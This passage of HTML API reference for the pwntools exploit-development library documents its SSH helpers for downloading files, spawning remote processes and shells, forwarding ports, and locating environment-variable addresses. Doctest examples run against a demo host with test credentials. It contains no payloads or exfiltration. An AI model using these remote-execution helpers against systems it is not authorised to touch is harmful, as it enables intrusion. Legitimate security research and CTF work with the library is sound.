<code class="descname">download</code><span class="sig-paren">(</span><em>file_or_directory</em>, <em>local=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1621-1637"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.download" title="Permalink to this definition">¶</a></dt>
<dd><p>Download a file or directory from the remote host.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>file_or_directory</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file or directory to download.</li>
<li><strong>local</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Local path to store the data.
By default, uses the current directory.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.download_data">
<code class="descname">download_data</code><span class="sig-paren">(</span><em>remote</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1408-1432"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.download_data" title="Permalink to this definition">¶</a></dt>
<dd><p>Downloads a file from the remote server and returns it as a string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>remote</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The remote filename to download.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/bar&#39;</span><span class="p">,</span><span class="s1">&#39;w+&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
<span class="gp">... </span>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Hello, world&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">cache</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">download_data</span><span class="p">(</span><span class="s1">&#39;/tmp/bar&#39;</span><span class="p">)</span>
<span class="go">&#39;Hello, world&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">_sftp</span> <span class="o">=</span> <span class="kc">None</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">_tried_sftp</span> <span class="o">=</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">download_data</span><span class="p">(</span><span class="s1">&#39;/tmp/bar&#39;</span><span class="p">)</span>
<span class="go">&#39;Hello, world&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.download_dir">
<code class="descname">download_dir</code><span class="sig-paren">(</span><em>remote=None</em>, <em>local=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1459-1498"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.download_dir" title="Permalink to this definition">¶</a></dt>
<dd><p>Recursively downloads a directory from the remote server</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>local</strong> &#8211; Local directory</li>
<li><strong>remote</strong> &#8211; Remote directory</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.download_file">
<code class="descname">download_file</code><span class="sig-paren">(</span><em>remote</em>, <em>local=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1434-1457"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.download_file" title="Permalink to this definition">¶</a></dt>
<dd><p>Downloads a file from the remote server.</p>
<p>The file is cached in /tmp/pwntools-ssh-cache using a hash of the file, so
calling the function twice has little overhead.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>remote</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The remote filename to download</li>
<li><strong>local</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The local filename to save it to. Default is to infer it from the remote filename.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.get">
<code class="descname">get</code><span class="sig-paren">(</span><em>file_or_directory</em>, <em>local=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1621-1637"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.get" title="Permalink to this definition">¶</a></dt>
<dd><p>download(file_or_directory, local=None)</p>
<p>Download a file or directory from the remote host.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>file_or_directory</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file or directory to download.</li>
<li><strong>local</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Local path to store the data.
By default, uses the current directory.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.getenv">
<code class="descname">getenv</code><span class="sig-paren">(</span><em>variable</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1098-1125"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.getenv" title="Permalink to this definition">¶</a></dt>
<dd><p>Retrieve the address of an environment variable on the remote
system.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">The exact address will differ based on what other environment
variables are set, as well as argv[0].  In order to ensure that
the path is <em>exactly</em> the same, it is recommended to invoke the
process with <code class="docutils literal"><span class="pre">argv=[]</span></code>.</p>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.interactive">
<code class="descname">interactive</code><span class="sig-paren">(</span><em>shell=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1693-1707"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.interactive" title="Permalink to this definition">¶</a></dt>
<dd><p>Create an interactive session.</p>
<p>This is a simple wrapper for creating a new
<a class="reference internal" href="#pwnlib.tubes.ssh.ssh_channel" title="pwnlib.tubes.ssh.ssh_channel"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_channel</span></code></a> object and calling
<a class="reference internal" href="#pwnlib.tubes.ssh.ssh_channel.interactive" title="pwnlib.tubes.ssh.ssh_channel.interactive"><code class="xref py py-meth docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_channel.interactive()</span></code></a> on it.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.libs">
<code class="descname">libs</code><span class="sig-paren">(</span><em>remote</em>, <em>directory=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1655-1691"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.libs" title="Permalink to this definition">¶</a></dt>
<dd><p>Downloads the libraries referred to by a file.</p>
<p>This is done by running ldd on the remote server, parsing the output
and downloading the relevant files.</p>
<p>The directory argument specified where to download the files. This defaults
to &#8216;./$HOSTNAME&#8217; where $HOSTNAME is the hostname of the remote server.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.listen">
<code class="descname">listen</code><span class="sig-paren">(</span><em>port=0</em>, <em>bind_address=''</em>, <em>timeout=pwnlib.timeout.Timeout.default</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1176-1198"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.listen" title="Permalink to this definition">¶</a></dt>
<dd><p>listen_remote(port = 0, bind_address = &#8216;&#8217;, timeout = Timeout.default) -&gt; ssh_connecter</p>
<p>Listens remotely through an SSH connection. This is equivalent to
using the <code class="docutils literal"><span class="pre">-R</span></code> flag on <code class="docutils literal"><span class="pre">ssh</span></code>.</p>
<p>Returns a <a class="reference internal" href="#pwnlib.tubes.ssh.ssh_listener" title="pwnlib.tubes.ssh.ssh_listener"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_listener</span></code></a> object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">listen_remote</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.listen_remote">
<code class="descname">listen_remote</code><span class="sig-paren">(</span><em>port = 0</em>, <em>bind_address = ''</em>, <em>timeout = Timeout.default</em><span class="sig-paren">)</span> &#x2192; ssh_connecter<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1176-1198"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.listen_remote" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens remotely through an SSH connection. This is equivalent to
using the <code class="docutils literal"><span class="pre">-R</span></code> flag on <code class="docutils literal"><span class="pre">ssh</span></code>.</p>
<p>Returns a <a class="reference internal" href="#pwnlib.tubes.ssh.ssh_listener" title="pwnlib.tubes.ssh.ssh_listener"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_listener</span></code></a> object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">listen_remote</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.process">
<code class="descname">process</code><span class="sig-paren">(</span><em>argv=None</em>, <em>executable=None</em>, <em>tty=True</em>, <em>cwd=None</em>, <em>env=None</em>, <em>timeout=pwnlib.timeout.Timeout.default</em>, <em>run=True</em>, <em>stdin=0</em>, <em>stdout=1</em>, <em>stderr=2</em>, <em>preexec_fn=None</em>, <em>preexec_args=[]</em>, <em>raw=True</em>, <em>aslr=None</em>, <em>setuid=None</em>, <em>shell=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L675-1045"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.process" title="Permalink to this definition">¶</a></dt>
<dd><p>Executes a process on the remote server, in the same fashion
as pwnlib.tubes.process.process.</p>
<p>To achieve this, a Python script is created to call <code class="docutils literal"><span class="pre">os.execve</span></code>
with the appropriate arguments.</p>
<p>As an added bonus, the <code class="docutils literal"><span class="pre">ssh_channel</span></code> object returned has a
<code class="docutils literal"><span class="pre">pid</span></code> property for the process pid.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>argv</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of arguments to pass into the process</li>
<li><strong>executable</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the executable to run.
If <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, <code class="docutils literal"><span class="pre">argv[0]</span></code> is used.</li>
<li><strong>tty</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Request a <cite>tty</cite> from the server.  This usually fixes buffering problems
by causing <cite>libc</cite> to write data immediately rather than buffering it.
However, this disables interpretation of control codes (e.g. Ctrl+C)
and breaks <cite>.shutdown</cite>.</li>
<li><strong>cwd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Working directory.  If <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, uses the working directory specified
on <a class="reference internal" href="#pwnlib.tubes.ssh.ssh.cwd" title="pwnlib.tubes.ssh.ssh.cwd"><code class="xref py py-attr docutils literal"><span class="pre">cwd</span></code></a> or set via <a class="reference internal" href="#pwnlib.tubes.ssh.ssh.set_working_directory" title="pwnlib.tubes.ssh.ssh.set_working_directory"><code class="xref py py-meth docutils literal"><span class="pre">set_working_directory()</span></code></a>.</li>
<li><strong>env</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Environment variables to set in the child.  If <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, inherits the
default environment.</li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Timeout to set on the <cite>tube</cite> created to interact with the process.</li>
<li><strong>run</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to <code class="xref py py-const docutils literal"><span class="pre">True</span></code> to run the program (default).
If <code class="xref py py-const docutils literal"><span class="pre">False</span></code>, returns the path to an executable Python script on the
remote server which, when executed, will do it.</li>
<li><strong>stdin</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; If an integer, replace stdin with the numbered file descriptor.
If a string, a open a file with the specified path and replace
stdin with its file descriptor.  May also be one of <code class="docutils literal"><span class="pre">sys.stdin</span></code>,
<code class="docutils literal"><span class="pre">sys.stdout</span></code>, <code class="docutils literal"><span class="pre">sys.stderr</span></code>.  If <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, the file descriptor is closed.</li>
<li><strong>stdout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; See <code class="docutils literal"><span class="pre">stdin</span></code>.</li>
<li><strong>stderr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; See <code class="docutils literal"><span class="pre">stdin</span></code>.</li>
<li><strong>preexec_fn</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; Function which is executed on the remote side before execve().
This <strong>MUST</strong> be a self-contained function &#8211; it must perform
all of its own imports, and cannot refer to variables outside
its scope.</li>
<li><strong>preexec_args</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#object" title="(in Python v2.7)"><em>object</em></a>) &#8211; Argument passed to <code class="docutils literal"><span class="pre">preexec_fn</span></code>.
This <strong>MUST</strong> only consist of native Python objects.</li>
<li><strong>raw</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, disable TTY control code interpretation.</li>
<li><strong>aslr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; See <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a> for more information.</li>
<li><strong>setuid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; See <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a> for more information.</li>
<li><strong>shell</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Pass the command-line arguments to the shell.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A new SSH channel, or a path to a script if <code class="docutils literal"><span class="pre">run=False</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Notes</p>
<p>Requires Python on the remote server.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PS1&#39;</span><span class="p">:</span><span class="s1">&#39;&#39;</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello; exit&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/bin/echo&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;\xff\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;readlink&#39;</span><span class="p">,</span> <span class="s1">&#39;/proc/self/exe&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;/bin/readlink\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;LOLOLOL&#39;</span><span class="p">,</span> <span class="s1">&#39;/proc/self/exe&#39;</span><span class="p">],</span> <span class="n">executable</span><span class="o">=</span><span class="s1">&#39;readlink&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;/bin/readlink\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;LOLOLOL</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;/proc/self/cmdline&#39;</span><span class="p">],</span> <span class="n">executable</span><span class="o">=</span><span class="s1">&#39;cat&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;LOLOLOL\x00/proc/self/cmdline\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">executable</span><span class="o">=</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">pid</span> <span class="ow">in</span> <span class="n">pidof</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span> 
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;pwd&#39;</span><span class="p">],</span> <span class="n">cwd</span><span class="o">=</span><span class="s1">&#39;/tmp&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;/tmp\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;import os; print os.read(2, 1024)&#39;</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/bin/echo&#39;</span><span class="p">,</span> <span class="s1">&#39;hello&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/bin/echo&#39;</span><span class="p">,</span> <span class="s1">&#39;hello&#39;</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="s1">&#39;/dev/null&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/usr/bin/env&#39;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{})</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;/usr/bin/env&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;A&#39;</span><span class="p">:</span><span class="s1">&#39;B&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;A=B\n&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;false&#39;</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="o">=</span><span class="mi">1234</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">preexec_fn must be a function</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;false&#39;</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="mi">1234</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">preexec_fn cannot be a lambda</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">uses_globals</span><span class="p">():</span>
<span class="gp">... </span>    <span class="n">foo</span> <span class="o">=</span> <span class="n">bar</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;false&#39;</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="o">=</span><span class="n">uses_globals</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
